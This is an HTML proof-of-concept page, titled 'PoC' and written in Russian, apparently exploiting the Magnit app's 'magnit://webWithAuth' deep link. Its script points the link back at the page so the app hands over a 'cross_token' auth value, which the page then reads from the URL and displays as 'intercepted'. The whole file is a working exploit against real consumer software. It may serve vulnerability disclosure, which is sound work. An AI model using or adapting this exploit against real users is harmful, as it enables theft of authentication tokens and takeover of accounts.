<!DOCTYPE html>
<html lang="ru">
<head>
<meta charset="UTF-8"> 
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>PoC</title>
<style>
  * { box-sizing: border-box; margin: 0; padding: 0; }
  body { font-family: -apple-system, "Segoe UI", Roboto, Arial, sans-serif; background: #f5f6f8;
         display: flex; align-items: center; justify-content: center; min-height: 100vh; }
  .box { width: 100%; max-width: 420px; padding: 24px; text-align: center; }
  .btn { display: block; width: 100%; padding: 18px; border: none; border-radius: 12px; 
         font-size: 17px; font-weight: 600; color: #fff; background: #e30611; cursor: pointer; text-decoration: none; }
  .btn:active { transform: scale(0.98); }
  #leak { display: none; margin-top: 20px; padding: 16px; border: 2px solid #e30611; border-radius: 12px;
          background: #fff0f0; font-size: 16px; font-weight: 600; color: #a30000; word-break: break-all; }
</style>
</head>
<body>
  <div class="box">
    <a class="btn" id="btn" href="#">Открыть через Магнит</a>
    <div id="leak">Перехвачено: <span id="tok"></span></div>
  </div>

 
<script>
(function () {
  var origin = location.protocol + "//" + location.host + location.pathname;
  var dl = "magnit://webWithAuth?url=" + encodeURIComponent(origin) + "&in_app=false";
  document.getElementById("btn").href = dl;

  var tok = new URLSearchParams(location.search).get("cross_token");
  if (tok) {
    document.getElementById("tok").textContent = tok;
    document.getElementById("leak").style.display = "block";
  }
})();
</script>
</body>
</html>
